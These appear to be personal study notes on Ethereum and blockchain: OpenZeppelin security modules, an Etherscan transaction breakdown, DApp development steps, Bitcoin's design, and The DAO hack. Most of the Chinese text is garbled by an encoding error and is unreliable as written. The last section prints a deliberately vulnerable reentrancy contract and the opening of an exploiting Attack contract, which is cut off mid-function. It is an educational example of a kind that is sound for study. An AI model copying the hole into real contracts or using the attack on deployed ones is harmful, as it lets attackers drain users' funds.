    - v4ï¼š**BUSL-1.1/åŒè®¸å¯**ï¼ˆéƒ¨åˆ†æ–‡ä»¶ MITï¼‰ï¼Œéšæ—¶é—´è½¬ä¸ºæ›´å®½æ¾è®¸å¯ï¼›DAO å¯¹ä¾‹å¤–æˆæƒ/æµç¨‹æœ‰ä¸“é—¨è®¨è®ºã€‚([GitHub](https://github.com/Uniswap/v4-core?utm_source=chatgpt.com "Core smart contracts of Uniswap v4"), [Uniswap Governance](https://gov.uniswap.org/t/establish-uniswap-v4-licensing-process/25443?utm_source=chatgpt.com "Establish Uniswap v4 Licensing Process"))

# 2025-08-14

# OpenZeppelin
ä»¥å¤ªåŠ/EVM ç”Ÿæ€æœ€ä¸»æµçš„æ™ºèƒ½åˆçº¦æ ‡å‡†åº“ï¼šæŠŠ ERC20/721/1155 ç­‰æ ‡å‡†å®ç°ã€æƒé™ä¸æ²»ç†ã€å¯å‡çº§åŸºå»ºå’Œå¤§é‡å®‰å…¨ç»„ä»¶åšæˆäº†å¯å¤ç”¨çš„æ¨¡å—ï¼Œç›®æ ‡æ˜¯â€œåœ¨ç»è¿‡ç¤¾åŒºéªŒè¯çš„ä»£ç ä¹‹ä¸Šå®‰å…¨å¼€å‘â€ã€‚([OpenZeppelin æ–‡æ¡£](https://docs.openzeppelin.com/contracts/5.x/?utm_source=chatgpt.com "Contracts - OpenZeppelin Docs"))

# å¦‚ä½•ç¡®ä¿åˆçº¦å®‰å…¨

1. **æ ‡å‡†åŒ–ä¸ç¤¾åŒºéªŒè¯**  
    å¤§é‡æ ¸å¿ƒåˆçº¦ï¼ˆERC20/721 ç­‰ï¼‰ä¸å·¥å…·é•¿æœŸåœ¨ç¤¾åŒºä¸­è¢«å¤ç”¨ä¸å®¡è§†ï¼Œå®˜æ–¹å®šä½å°±æ˜¯â€œä¸ºå®‰å…¨åˆçº¦å¼€å‘è€Œå»ºçš„åº“â€ã€‚è¿™èƒ½æ˜¾è‘—é™ä½è‡ªå†™è½®å­çš„å®‰å…¨é£é™©ã€‚
    
2. **å†…ç½®é˜²å¾¡ç»„ä»¶ï¼Œè¦†ç›–é«˜é¢‘æ”»å‡»é¢**    
    - `ReentrancyGuard`ï¼šä¸€é”®ç»™å…³é”®å‡½æ•°åŠ é˜²é‡å…¥æŠ¤æ ã€‚        
    - `Pausable`ï¼šç´§æ€¥åˆ¶åŠ¨ï¼ˆcircuit breakerï¼‰ï¼Œäº‹æ•…å‘ç”Ÿæ—¶å¯ä¸´æ—¶å†»ç»“æ•æ„Ÿæ“ä½œã€‚        
    - `PullPayment`ï¼šæŠŠâ€œä¸»åŠ¨è½¬è´¦â€æ”¹ä¸ºâ€œå—æ–¹ä¸»åŠ¨æå–â€ï¼Œè§„é¿å¸¸è§é‡å…¥é™·é˜±ã€‚  
        è¿™äº›æ¨¡å¼éƒ½æ˜¯å›´ç»•å®é™…æ”»å‡»é¢æ²‰æ·€ä¸‹æ¥çš„â€œå®‰å…¨ç¼ºçœâ€ã€‚
        
3. **ä¸â€œä¸è§„èŒƒä»£å¸â€çš„å®‰å…¨äº¤äº’**  
    ç”Ÿæ€é‡Œä¸€äº› ERC-20 åˆçº¦ä¸æŒ‰è§„èŒƒè¿”å› `bool`ï¼ˆå¦‚ USDT æ—©æœŸå®ç°ï¼‰ã€‚`SafeERC20` å¯¹ `transfer/transferFrom/approve` åšäº†å®‰å…¨å°è£…ï¼Œç»Ÿä¸€å¤„ç†å¼‚å¸¸ä¸è¿”å›å€¼ï¼Œé¿å…ç¡¬ç¼–ç å¤„ç†å‡ºé”™ã€‚
    
4. **ç±»å‹ä¸æ•°å­¦å®‰å…¨**  
    æä¾› `SafeCast`ã€`Math` ç­‰å·¥å…·ï¼Œé¿å…é™é»˜æˆªæ–­ã€ä¸‹æº¢/ä¸Šæº¢ç­‰æ•°å€¼ç±»é—®é¢˜ï¼ˆSolidity æ–°ç‰ˆæœ¬å·²è‡ªå¸¦æº¢å‡ºæ£€æŸ¥ï¼Œä½†è¾¹ç•Œä¸ç±»å‹è½¬æ¢ä»éœ€å°å¿ƒï¼‰
    
5. **æƒé™ä¸æ²»ç†çš„ç³»ç»ŸåŒ–è®¾è®¡**    
    - `Ownable/AccessControl` ä¸ **`AccessManager`**ï¼šä»å•ç®¡ç†å‘˜åˆ°å¤šè§’è‰²åˆ†æƒï¼Œç”šè‡³å¯ä¸ºè§’è‰²é…ç½®**æ‰§è¡Œå»¶è¿Ÿ**ä¸è·¨åˆçº¦æƒé™ï¼Œé˜²æ­¢â€œé’¥åŒ™ä¸€æŠŠæŠ“â€ã€‚        
    - `TimelockController`ï¼šå¯¹å…³é”®æ“ä½œåŠ **æ—¶é—´å»¶è¿Ÿ**ï¼Œç»™ç¤¾åŒºæˆ–ç”¨æˆ·ç•™å‡ºè§‚å¯Ÿ/é€€å‡ºçª—å£ï¼Œæ˜¯å»ä¸­å¿ƒåŒ–æ²»ç†çš„å®‰å…¨å¸¸è¯†ã€‚  
        è¿™äº›ç»„åˆèƒ½æŠŠâ€œæƒé™è¯¯ç”¨/æ¶æ„â€çš„ç³»ç»Ÿæ€§é£é™©é™åˆ°æœ€ä½ã€‚
        
6. **å¯å‡çº§åˆçº¦çš„â€œå®‰å…¨æŠ¤æ â€**  
    å‡çº§æ’ä»¶åœ¨éƒ¨ç½²ä¸å‡çº§æ—¶ä¼š**è‡ªåŠ¨åšä¸¤ç±»æ ¡éªŒ**ï¼š    
    - **å‡çº§å®‰å…¨æ€§**ï¼ˆå¦‚æ˜¯å¦ä½¿ç”¨äº† constructorã€æ˜¯å¦æ­£ç¡®åˆå§‹åŒ–ç­‰ï¼‰ï¼›        
    - **å­˜å‚¨å¸ƒå±€å…¼å®¹æ€§**ï¼ˆé˜²æ­¢å˜é‡é¡ºåº/ç±»å‹å˜æ›´å¯¼è‡´çš„æ•°æ®â€œé”™ä½â€ï¼‰ã€‚  
        æ ¡éªŒä¸è¿‡å°±é˜»æ­¢å‡çº§ï¼Œé¿å…ç”Ÿäº§äº‹æ•…ã€‚
        
7. **å®¡è®¡ä¸å®‰å…¨ç ”ç©¶èƒŒä¹¦**  
    OpenZeppelin ï¼Œç»´æŠ¤åº“ï¼Œä¹Ÿæä¾›è¡Œä¸šå¤´éƒ¨çš„å®‰å…¨å®¡è®¡æœåŠ¡ï¼šå¤šç ”ç©¶å‘˜äº¤å‰å®¡é˜…ï¼Œå¿…è¦æ—¶åšæ¨¡ç³Š/ä¸å˜å¼æµ‹è¯•ï¼›å®˜æ–¹æŠ«éœ²äº†**700+å®¡è®¡ã€8000+é—®é¢˜å‘ç°**çš„ç»Ÿè®¡é‡ï¼Œé•¿æœŸæŠŠç ”ç©¶ç»“è®ºåå“ºåˆ°åº“ä¸æ–‡æ¡£ã€‚
    
8. **å¯†ç å­¦ä¸ç­¾åæ ‡å‡†çš„è½åœ°å®ç°**  
    æä¾› `EIP712` ç­‰å¯†ç å­¦å·¥å…·/æ¥å£ï¼Œå¸®åŠ©ä½ ç”¨æ ‡å‡†åŒ–æ–¹å¼å¤„ç†ç­¾åä¸åŸŸéš”ç¦»ï¼Œå‡å°‘é‡æ”¾ä¸ç­¾åæ»¥ç”¨çš„é£é™©ã€‚
    
## å¸¸è§é£é™© â†’ å¯¹åº”æ–¹æ¡ˆ

- é‡å…¥æ”»å‡» â†’ `ReentrancyGuard` æˆ–æ”¹ç”¨ `PullPayment`ã€‚    
- ç®¡ç†å‘˜è¯¯æ“ä½œ/å•ç‚¹é£é™© â†’ `AccessManager/AccessControl` + `TimelockController`ï¼ˆå¿…è¦æ—¶å åŠ å¤šç­¾ï¼‰ã€‚
- ç´§æ€¥æ¼æ´çˆ†å‘ â†’ `Pausable` ä¸´æ—¶å†»ç»“æ•æ„ŸåŠŸèƒ½ï¼Œèµ¢å¾—ä¿®å¤çª—å£ã€‚    
- å‡çº§æŠŠçŠ¶æ€æä¹± â†’ ä½¿ç”¨å‡çº§æ’ä»¶çš„**å‡çº§/å­˜å‚¨å¸ƒå±€æ ¡éªŒ**ã€‚
- ä¸â€œéæ ‡å‡†â€ERC-20 äº¤äº’å¤±è´¥ â†’ ç»Ÿä¸€ç”¨ `SafeERC20` å°è£…ã€‚

# 2025-08-12

# Etherscanå†…å®¹åˆ†æ

| å­—æ®µ                          | å†…å®¹                                                                   |
| --------------------------- | -------------------------------------------------------------------- |
| **äº¤æ˜“å“ˆå¸Œ (Transaction Hash)** | `0x494dc66209465c96204d59005b0bf9e9b5ce5dd2c0c09de3394f396724a932de` |
| **çŠ¶æ€ (Status)**             | âœ… æˆåŠŸ (Success)                                                       |
| **æ‰€åœ¨åŒºå— (Block)**            | `8967679`ï¼ˆå·²ç¡®è®¤ 471 ä¸ªåŒºå—ï¼‰                                               |
| **æ—¶é—´æˆ³ (Timestamp)**         | `2025-08-12 10:32:36 AM UTC`ï¼ˆçº¦ 1 å°æ—¶å‰ï¼‰                                |
| **å‘é€æ–¹ (From)**              | `0xBF654d909728d4a40ADBFfB2A5Dc540827D158D8`                         |
| **æ¥æ”¶æ–¹ (To, åˆçº¦åœ°å€)**          | `0x1888eED3F821558f8aAe128EcFb0224B86FFdD49`                         |
| **äº¤æ˜“ç±»å‹ (Txn Type)**         | Type 2 (EIP-1559)                                                    |
| **Nonce**                   | 3                                                                    |
| **åŒºå—å†…ä½ç½®**                   | 27                                                                   |

| é¡¹ç›®                                 | æ•°å€¼                                    |
| ---------------------------------- | ------------------------------------- |
| **è½¬è´¦é‡‘é¢ (Value)**                   | `0 ETH`ï¼ˆæ­¤äº¤æ˜“ä»…è°ƒç”¨åˆçº¦å‡½æ•°ï¼Œæ— èµ„é‡‘è½¬ç§»ï¼‰             |
| **äº¤æ˜“æ‰‹ç»­è´¹ (Transaction Fee)**        | `0.00000792154930663 ETH`             |
| **Gas ä»·æ ¼ (Gas Price)**             | `1.501004132 Gwei`                    |
| **Gas é™é¢ä¸ä½¿ç”¨é‡ (Gas Limit & Usage)** | é™é¢ï¼š`53,567`ï¼›å®é™…ä½¿ç”¨ï¼š`52,775`ï¼ˆä½¿ç”¨ç‡ 98.52%ï¼‰ |
| **åŸºç¡€è´¹ (Base Fee)**                 | `0.001004132 Gwei`                    |
| **æœ€å¤§è´¹ç”¨ (Max Fee)**                 | `1.5014732 Gwei`                      |
| **æœ€å¤§ä¼˜å…ˆè´¹ (Max Priority Fee)**       | `1.5 Gwei`                            |
| **é”€æ¯è´¹ç”¨ (Burnt)**                   | `0.0000000529930663 ETH`              |
| **èŠ‚çœè´¹ç”¨ (Txn Savings)**             | `0.0000000247550637 ETH`              |

## è°ƒç”¨å‡½æ•°
```
function leaveMessage(string _text)
```

## äº¤æ˜“è¾“å…¥æ•°æ®
```
[0]: 000000000000000...00020  
[1]: 000000000000000...00005  
[2]: 68656c6c6f00000...00000
```
- `0x20`ï¼šå­—ç¬¦ä¸²åœ¨ calldata ä¸­çš„åç§»é‡ï¼ˆ32 å­—èŠ‚åå¼€å§‹ï¼‰ã€‚    
- `0x05`ï¼šå­—ç¬¦ä¸²é•¿åº¦ = 5ã€‚    
- `0x68656c6c6f`ï¼š`"hello"`çš„ASCIIç ã€‚

## EIP-1559 è´¹ç”¨
æ˜¯ **Type 2** äº¤æ˜“ï¼ˆEIP-1559 æ ¼å¼ï¼‰ï¼ŒGas è´¹ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š
1. **Base Feeï¼ˆåŸºç¡€è´¹ï¼‰**ï¼šç”±åè®®è®¾å®šï¼Œå¹¶ä¼šè¢«é”€æ¯ï¼ˆBurntï¼‰ï¼Œé˜²æ­¢é€šèƒ€ã€‚    
2. **Priority Feeï¼ˆä¼˜å…ˆè´¹ / å°è´¹ï¼‰**ï¼šæ”¯ä»˜ç»™çŸ¿å·¥ï¼ˆç°ä¸ºéªŒè¯è€…ï¼‰ä½œä¸ºæ‰“åŒ…æ¿€åŠ±ã€‚

# 2025-08-11

# DApp å¼€å‘ç”Ÿå‘½å‘¨æœŸ

## 1) éœ€æ±‚ä¸æ¶æ„

- æ˜ç¡® MVPï¼šé¡µé¢ï¼ˆè¿åŠ¨å‘˜é¡µ/æŠ•èµ„é¡µï¼‰ã€æœ€å°‘åˆçº¦ï¼ˆè¿åŠ¨å‘˜ Token + å¸‚åœºï¼‰ã€æœ€å°‘æ•°æ®äº‹ä»¶ï¼ˆæ¯”èµ›æ•°æ®ã€è®­ç»ƒæ‰“å¡ï¼‰ã€‚    
- é€‰é“¾ï¼šEVM å…¼å®¹ã€æ‰‹ç»­è´¹ä½ï¼ˆPolygon/Base/BNB/Inj ï¼‰ã€‚    
- æ¶æ„å››ä»¶å¥—ï¼šå‰ç«¯ + æ™ºèƒ½åˆçº¦ + **ç´¢å¼•å™¨**ï¼ˆè¯»äº‹ä»¶åˆ°æ•°æ®åº“ï¼‰+ å»ä¸­å¿ƒåŒ–å­˜å‚¨ï¼ˆIPFS/Arweaveï¼‰ã€‚     
## 2) åˆçº¦å¼€å‘

- å·¥å…·ï¼š **Hardhat**ï¼ˆç”Ÿæ€å…¨ï¼‰ã€‚    
- æ­¥éª¤ï¼šå†™åˆçº¦ â†’ å•å…ƒæµ‹è¯• â†’ æœ¬åœ°é“¾éªŒè¯ï¼ˆanvil/hardhat nodeï¼‰ã€‚    
- åŸºäº OpenZeppelinï¼ˆERC-20/1155 + AccessControlï¼‰å‡å°‘å‘ã€‚ 

## 3) ç´¢å¼•å™¨

- ä½œç”¨ï¼šæŠŠåˆçº¦ **Events**ï¼ˆå¦‚ä»·æ ¼å˜æ›´ã€æˆäº¤ï¼‰æ¶ˆè´¹è¿›æ•°æ®åº“ï¼Œå‰ç«¯æŸ¥è¯¢æ›´å¿«æ›´çµæ´»ã€‚    
- æ–¹æ¡ˆï¼š**The Graph/Subgraph** æˆ– **Ponderï¼ˆTypeScriptï¼‰**ï¼›å­˜ PostgreSQLã€‚    
- äº§å‡ºï¼šå­å›¾/å¤„ç†å™¨ï¼Œå®šä¹‰è¦ç›‘å¬çš„äº‹ä»¶å­—æ®µä¸å†™åº“é€»è¾‘ã€‚     
## 4) å‰ç«¯
- æ¡†æ¶ï¼šReact/Nextã€‚    
- é’±åŒ…ï¼šMetaMask / WalletConnectã€‚    
- äº¤äº’åº“ï¼š**Viem + Wagmi**ï¼ˆç±»å‹å¥½ã€ä½“éªŒç¨³å®šï¼›æˆ– ethers.jsï¼‰ã€‚    
- é¡µé¢ï¼šè¿æ¥é’±åŒ…ã€è¿åŠ¨å‘˜åˆ—è¡¨/è¯¦æƒ…ã€ä¸‹å•/æ’¤å•ã€æˆ‘çš„æŒä»“ã€‚
## 5) é“¾äº¤äº’

- è¯»å–ï¼šè°ƒç”¨åˆçº¦ view æ–¹æ³•æˆ–ä»ç´¢å¼•å™¨å–èšåˆæ•°æ®ã€‚    
- å†™å…¥ï¼šç”¨æˆ·ç”¨é’±åŒ…ç­¾åï¼Œå‰ç«¯å‘äº¤æ˜“ï¼Œç›‘å¬ç¡®è®¤ã€‚    
- å¤„ç†å¥½ pending/ç¡®è®¤/å¤±è´¥ä¸‰ç§çŠ¶æ€ã€‚ 

## 6) é¢„è¨€æœºä¸å¤–éƒ¨æ•°æ®ï¼ˆå…ˆåšâ€œåŠæ‰‹åŠ¨â€ï¼‰

- MVP ç®€åŒ–ï¼šå…ˆç”±â€œè¿è¥åå°â€æˆ–è„šæœ¬æŠŠæ¯”èµ›/è®­ç»ƒæ•°æ®å–‚ç»™åˆçº¦ï¼ˆç®¡ç†å‘˜è§’è‰²ï¼‰ã€‚    
- è¿›é˜¶ï¼šæ¥ **Chainlink** æˆ–å…¶ä»–å¯ä¿¡æºï¼Œå¤šæºèšåˆã€å¼‚å¸¸å›é€€ã€‚ 
## 7) éƒ¨ç½²ä¸ä¸Šçº¿

- åˆçº¦ï¼šå…ˆæµ‹è¯•ç½‘ï¼ˆSepolia/Holeskyï¼‰ï¼Œå†ä¸»ç½‘/ä¾§é“¾ã€‚    
- å‰ç«¯ï¼šVercel/Netlifyï¼ˆæˆ–éƒ¨ç½²åˆ° **IPFS**ï¼‰ã€‚    
- éªŒè¯ï¼šåŒºå—æµè§ˆå™¨éªŒè¯åˆçº¦ï¼Œå‡†å¤‡æœ€å°ä½¿ç”¨æ‰‹å†Œ/å¼•å¯¼ã€‚ 
## 8) åŸºç¡€æµ‹è¯•ä¸å®‰å…¨

- å•å…ƒæµ‹è¯•ï¼ˆåˆçº¦ï¼‰ï¼šä»·æ ¼æ›´æ–°ã€ä¸‹å•/æ’¤å•ã€æƒé™ã€‚    
- E2Eï¼šå‰ç«¯è„šæœ¬è¿æµ‹è¯•ç½‘èµ°ä¸€éä¸»æµç¨‹ã€‚    
- å…ˆè‡ªæµ‹ + å°èŒƒå›´å†…æµ‹ï¼Œåç»­å†è€ƒè™‘ç¬¬ä¸‰æ–¹å®¡è®¡/èµé‡‘ã€‚

# 2025-08-09

## ä¸€ã€åŒé‡æ”¯ä»˜é—®é¢˜ï¼ˆDouble-Spendingï¼‰

### â€‹**â€‹å…³é”®é—®é¢˜â€‹**â€‹

ä¼ ç»Ÿç”µå­æ”¯ä»˜ä¾èµ–é‡‘èæœºæ„ä½œä¸ºç¬¬ä¸‰æ–¹éªŒè¯äº¤æ˜“ï¼Œé˜²æ­¢åŒä¸€ç¬”èµ„é‡‘è¢«é‡å¤ä½¿ç”¨ï¼ˆåŒé‡æ”¯ä»˜ï¼‰ã€‚è¿™å¯¼è‡´ï¼š

1. â€‹**â€‹ä¿¡ä»»æˆæœ¬é«˜â€‹**â€‹ï¼šéœ€ç¬¬ä¸‰æ–¹æ‹…ä¿äº¤æ˜“æœ‰æ•ˆæ€§ï¼›
2. â€‹**â€‹äº¤æ˜“ä¸å¯é€†â€‹**â€‹ï¼šé‡‘èæœºæ„å¯ä»²è£äº‰è®®ï¼Œé€†è½¬äº¤æ˜“ï¼Œå¢åŠ æ¬ºè¯ˆé£é™©ï¼›
3. â€‹**â€‹å°é¢æ”¯ä»˜ä¸å¯è¡Œâ€‹**â€‹ï¼šé«˜æ‰‹ç»­è´¹é™åˆ¶å¾®æ”¯ä»˜åœºæ™¯ã€‚

### â€‹**â€‹è§£å†³æ–¹æ¡ˆï¼šå·¥ä½œé‡è¯æ˜ï¼ˆPoWï¼‰ä¸åŒºå—é“¾â€‹**â€‹

1. â€‹**â€‹æ—¶é—´æˆ³æœåŠ¡å™¨+å“ˆå¸Œé“¾â€‹**â€‹
    - æ¯ç¬”äº¤æ˜“é€šè¿‡â€‹**â€‹æ—¶é—´æˆ³â€‹**â€‹ç»‘å®šåˆ°åŒºå—ï¼Œå¹¶å¹¿æ’­è‡³å…¨ç½‘ï¼›
    - åŒºå—é€šè¿‡â€‹**â€‹å“ˆå¸ŒæŒ‡é’ˆâ€‹**â€‹è¿æ¥æˆé“¾ï¼Œç¯¡æ”¹ä»»ä¸€åŒºå—éœ€é‡åšåç»­æ‰€æœ‰åŒºå—çš„å“ˆå¸Œè®¡ç®—ã€‚
2. â€‹**â€‹åˆ†å¸ƒå¼å…±è¯†æœºåˆ¶â€‹**â€‹
    - èŠ‚ç‚¹ä»¥â€‹**â€‹æœ€é•¿é“¾ä¸ºæœ‰æ•ˆé“¾â€‹**â€‹ï¼ˆä»£è¡¨æœ€å¤§ç®—åŠ›æŠ•å…¥ï¼‰ï¼›
    - è¯šå®èŠ‚ç‚¹æ§åˆ¶å¤šæ•°ç®—åŠ›æ—¶ï¼Œæ”»å‡»è€…æ— æ³•è¿½ä¸Šé“¾çš„å¢é•¿é€Ÿåº¦ï¼ˆæ¦‚ç‡æŒ‡æ•°çº§ä¸‹é™ï¼‰ã€‚



## äºŒã€å»ä¸­å¿ƒåŒ–ç½‘ç»œä¸‹çš„ä¿¡ä»»å»ºç«‹

### â€‹**â€‹å…³é”®é—®é¢˜â€‹**â€‹

å¦‚ä½•åœ¨æ— ä¸­å¿ƒæœºæ„çš„ç‚¹å¯¹ç‚¹ç½‘ç»œä¸­ï¼Œç¡®ä¿æ‰€æœ‰èŠ‚ç‚¹å¯¹äº¤æ˜“é¡ºåºè¾¾æˆä¸€è‡´ï¼Ÿ

### â€‹**â€‹è§£å†³æ–¹æ¡ˆï¼šæ¿€åŠ±æœºåˆ¶ä¸PoWâ€‹**â€‹

1. â€‹**â€‹å·¥ä½œé‡è¯æ˜ï¼ˆPoWï¼‰â€‹**â€‹
    - èŠ‚ç‚¹é€šè¿‡è®¡ç®—å¯»æ‰¾æ»¡è¶³éš¾åº¦ç›®æ ‡çš„â€‹**â€‹Nonceå€¼â€‹**â€‹ï¼ˆå¦‚SHA-256å“ˆå¸Œå€¼ä»¥å¤šä¸ª0å¼€å¤´ï¼‰ï¼Œæ¶ˆè€—CPUç®—åŠ›è¯æ˜â€œè¯šå®å·¥ä½œâ€ï¼›
    - â€‹**â€‹â€œä¸€CPUä¸€ç¥¨â€â€‹**â€‹ ï¼šç®—åŠ›å†³å®šæŠ•ç¥¨æƒé‡ï¼Œæ›¿ä»£æ˜“è¢«æ“æ§çš„IPæŠ•ç¥¨æœºåˆ¶ã€‚
2. â€‹**â€‹ç»æµæ¿€åŠ±â€‹**â€‹
    - â€‹**â€‹åŒºå—å¥–åŠ±â€‹**â€‹ï¼šçŸ¿å·¥æ‰“åŒ…æ–°åŒºå—å¯è·å¾—æ–°ç”Ÿæˆçš„æ¯”ç‰¹å¸ï¼ˆåˆå§‹50 BTC/åŒºå—ï¼‰ï¼›
    - â€‹**â€‹äº¤æ˜“æ‰‹ç»­è´¹â€‹**â€‹ï¼šè¾“å…¥å€¼ä¸è¾“å‡ºå€¼çš„å·®é¢ä½œä¸ºæ‰‹ç»­è´¹ï¼Œé•¿æœŸæ›¿ä»£åŒºå—å¥–åŠ±ã€‚



## ä¸‰ã€æ•°æ®å­˜å‚¨ä¸éªŒè¯æ•ˆç‡

### â€‹**â€‹å…³é”®é—®é¢˜â€‹**â€‹

åŒºå—é“¾æ•°æ®éšæ—¶é—´çº¿æ€§å¢é•¿ï¼Œå…¨èŠ‚ç‚¹å­˜å‚¨è´Ÿæ‹…é‡ï¼Œè½»èŠ‚ç‚¹å¦‚ä½•å¿«é€ŸéªŒè¯äº¤æ˜“ï¼Ÿ

### â€‹**â€‹è§£å†³æ–¹æ¡ˆï¼šé»˜å…‹å°”æ ‘ä¸ç®€åŒ–æ”¯ä»˜éªŒè¯ï¼ˆSPVï¼‰â€‹**â€‹

1. â€‹**â€‹é»˜å…‹å°”æ ‘ï¼ˆMerkle Treeï¼‰â€‹**â€‹
    - äº¤æ˜“å“ˆå¸Œå€¼é€å±‚è®¡ç®—ç”Ÿæˆâ€‹**â€‹æ ¹å“ˆå¸Œâ€‹**â€‹å­˜å‚¨äºåŒºå—å¤´ï¼ˆä»…80å­—èŠ‚ï¼‰ï¼Œè€åŒºå—å¯åˆ é™¤äº¤æ˜“ç»†èŠ‚ä¿ç•™æ ¹å“ˆå¸Œã€‚
2. â€‹**â€‹SPVï¼ˆSimplified Payment Verificationï¼‰â€‹**â€‹
    - è½»èŠ‚ç‚¹ä»…ä¿å­˜â€‹**â€‹åŒºå—å¤´â€‹**â€‹ï¼Œé€šè¿‡éªŒè¯Merkleåˆ†æ”¯ç¡®è®¤äº¤æ˜“æ˜¯å¦è¢«çº³å…¥åŒºå—ï¼›
    - ä¾èµ–è¯šå®èŠ‚ç‚¹è­¦æŠ¥æœºåˆ¶ï¼šå‘ç°æ— æ•ˆåŒºå—æ—¶é€šçŸ¥å…¨ç½‘ä¸‹è½½å®Œæ•´æ•°æ®ã€‚



## å››ã€éšç§ä¿æŠ¤ä¸åŒ¿åæ€§

### â€‹**â€‹å…³é”®é—®é¢˜â€‹**â€‹

å…¬å¼€è´¦æœ¬å¦‚ä½•å¹³è¡¡é€æ˜æ€§ä¸ç”¨æˆ·éšç§ï¼Ÿ

### â€‹**â€‹è§£å†³æ–¹æ¡ˆï¼šå¯†ç å­¦åŒ¿åæœºåˆ¶â€‹**â€‹

1. â€‹**â€‹å…¬é’¥åŒ¿åâ€‹**â€‹
    - äº¤æ˜“è®°å½•æ˜¾ç¤ºåœ°å€é—´çš„è½¬è´¦ï¼Œä½†â€‹**â€‹ä¸ç»‘å®šç”¨æˆ·çœŸå®èº«ä»½â€‹**â€‹ï¼ˆç±»ä¼¼è‚¡å¸‚äº¤æ˜“ï¼‰ï¼›
2. â€‹**â€‹åŠ¨æ€åœ°å€ç”Ÿæˆâ€‹**â€‹
    - æ¯æ¬¡äº¤æ˜“ç”Ÿæˆâ€‹**â€‹æ–°åœ°å€â€‹**â€‹ï¼Œé¿å…åœ°å€å¤ç”¨å¯¼è‡´è¡Œä¸ºæº¯æºã€‚



## äº”ã€å¯¹æ™ºèƒ½åˆçº¦å¼€å‘è€…çš„å¯ç¤º

|â€‹**â€‹æ¯”ç‰¹å¸è®¾è®¡â€‹**â€‹|â€‹**â€‹æ™ºèƒ½åˆçº¦åº”ç”¨â€‹**â€‹|
|||
|å·¥ä½œé‡è¯æ˜ï¼ˆPoWï¼‰|å…±è¯†ç®—æ³•é€‰æ‹©ï¼ˆå¦‚PoSã€PoAï¼‰|
|é»˜å…‹å°”æ ‘|é«˜æ•ˆçŠ¶æ€éªŒè¯ï¼ˆå¦‚ä»¥å¤ªåŠçŠ¶æ€æ ‘ï¼‰|
|ç»æµæ¿€åŠ±|ä»£å¸ç»æµæ¨¡å‹è®¾è®¡ï¼ˆDeFiã€GameFiï¼‰|
|ç®€åŒ–æ”¯ä»˜éªŒè¯ï¼ˆSPVï¼‰|è½»å®¢æˆ·ç«¯å¼€å‘ï¼ˆé’±åŒ…ã€è·¨é“¾æ¡¥ï¼‰|

å¯ç»“åˆâ€‹**â€‹Solidityè¯­è¨€â€‹**â€‹å’Œâ€‹**â€‹ä»¥å¤ªåŠè™šæ‹Ÿæœºï¼ˆEVMï¼‰â€‹**â€‹ [æ™ºèƒ½åˆçº¦å¼€å‘æŒ‡å—]

# 2025-08-08

æ™ºèƒ½åˆçº¦ç›¸å…³å®‰å…¨äº‹ä»¶ï¼š

- **The DAOäº‹ä»¶ï¼ˆ2016å¹´ï¼‰**ï¼šé»‘å®¢åˆ©ç”¨æ™ºèƒ½åˆçº¦ä¸­çš„é‡å…¥æ¼æ´ï¼Œä»è‡ªæ²»åŸºé‡‘åˆçº¦ä¸­ç›—èµ°360ä¸‡ä¸ªä»¥å¤ªå¸ï¼Œå¯¼è‡´ä»¥å¤ªåŠç¤¾åŒºä¸å¾—ä¸è¿›è¡Œç¡¬åˆ†å‰ï¼Œè¿™æ˜¯æ™ºèƒ½åˆçº¦å®‰å…¨å²ä¸Šçš„å…¸å‹ä¸¥é‡äº‹ä»¶ã€‚[nsfocus](https://blog.nsfocus.net/securityloophole/)
  åŸç†ï¼š
	- é€šè¿‡è¢«æ”»å‡»è€…æ§åˆ¶çš„æ¶æ„åˆçº¦å‘èµ·ä¸€ç¬”éé¢„æœŸçš„å¤–éƒ¨è°ƒç”¨æ‰“æ–­ç›®æ ‡åˆçº¦çš„æ­£å¸¸æ‰§è¡Œé€»è¾‘ï¼Œç»•è¿‡ä»£ç çš„é™åˆ¶æ¡ä»¶ï¼Œä¸€ç›´é‡å¤ç»•è¿‡è¿™ä¸ªé™åˆ¶æ¡ä»¶ã€‚(æ‰“ä¸ªæ¯”æ–¹ï¼Œæ¯”å¦‚ç°åœ¨å»ä¸€ä¸ªè®¾è®¡æœ‰ç¼ºé™·çš„ATMææ¬¾ï¼Œæ’å…¥å¡ç‰‡åè¾“å…¥æç°1000ï¼ŒATMæœºå¼€å§‹æ•°é’±ï¼Œä½†æ˜¯è¿˜æ²¡æ•°å‡ºæ¥ï¼Œè´¦æˆ·ä½™é¢ä¹Ÿè¿˜æ²¡è¢«æ‰£é™¤è¿™1000çš„é‚£ä¸ªç¬é—´ï¼Œæœ‰ä¸ªé»‘å®¢åˆ©ç”¨è¿™ä¸ªç¼ºé™·çš„æ¼æ´æ§åˆ¶ATM"é‡æ–°"æ‰§è¡Œä¸€æ¬¡'æç°1000'ï¼Œç„¶åATMå†æ¬¡æ£€æŸ¥è´¦æˆ·å‘ç°ï¼Œæ¬¸å¯¹è€¶ï¼Œé’±è¿˜å¤Ÿï¼Œåˆæ•°äº†ä¸€æ¬¡é’±ï¼Œç„¶åè¿™ä¸ªè¿‡ç¨‹ä¸æ–­é‡å¤ï¼ŒçŸ¥é“ç°é‡‘æç©ºï¼Œè€Œé“¶è¡Œè´¦æˆ·æœ€ç»ˆåªä¼šè¢«æ‰£ä¸€æ¬¡æ¬¾)
![](Pasted%20image%2020250808155506.png)
	
```
// è­¦å‘Šï¼šè¿™æ˜¯ä¸€ä¸ªæœ‰ä¸¥é‡æ¼æ´çš„åˆçº¦ï¼
contract EtherStore {
    mapping(address => uint) public balances;

    // ... çœç•¥å­˜æ¬¾ç­‰å…¶ä»–å‡½æ•° ...

    function withdraw(uint _amount) public {
        // 1. æ£€æŸ¥ä½™é¢æ˜¯å¦è¶³å¤Ÿ
        require(balances[msg.sender] >= _amount);

        // 2. è½¬è´¦ç»™è°ƒç”¨è€… (é—®é¢˜æ‰€åœ¨ï¼)
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        // 3. æ›´æ–°è´¦æˆ·ä½™é¢
        balances[msg.sender] -= _amount;
    }
}
```

```
import "./EtherStore.sol";

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // fallback å‡½æ•°æ˜¯å…³é”®ï¼Œå½“åˆçº¦æ”¶åˆ°ä»¥å¤ªå¸æ—¶ä¼šè¢«è§¦å‘
    fallback() external payable {
